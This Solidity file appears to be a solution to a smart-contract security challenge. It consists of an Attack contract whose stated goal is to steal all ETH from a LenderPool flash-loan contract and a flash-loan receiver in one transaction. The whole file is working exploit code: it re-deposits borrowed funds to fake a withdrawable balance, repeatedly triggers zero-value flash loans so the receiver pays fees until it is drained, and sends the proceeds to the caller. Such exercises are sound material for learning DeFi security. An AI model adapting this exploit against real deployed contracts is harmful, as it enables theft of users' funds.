// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./LenderPool.sol";

// GOAL OF ATTACK:
// Steal all of the eth inside the lender pool and the flash loan reciever contract in a single transaction.

contract Attack {
    LenderPool public pool;
    address public immutable reciever;
    uint256 public initialPoolBalance;
    uint256 public initialRecieverBalance;

    constructor(LenderPool _pool, address _reciever) {
        initialPoolBalance = address(_pool).balance;
        initialRecieverBalance = address(_reciever).balance;
        pool = _pool;
        reciever = _reciever;
    }

    function flashLoanAttack() external {
        pool.flashLoan(address(this), initialPoolBalance);
        pool.withdraw(initialPoolBalance);
        pool.flashLoan(address(this), initialRecieverBalance);
        pool.withdraw(initialRecieverBalance + pool.FEE());
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success);
    }

    function execute(uint256 _fee) external payable {
        if (msg.value == initialPoolBalance) {
            for (uint256 i = 0; i < 10; i++) {
                pool.flashLoan(reciever, 0);
            }
            pool.deposit{value: msg.value}();
        } else {
            pool.deposit{value: initialRecieverBalance + _fee}();
        }
    }

    receive() external payable {}
}
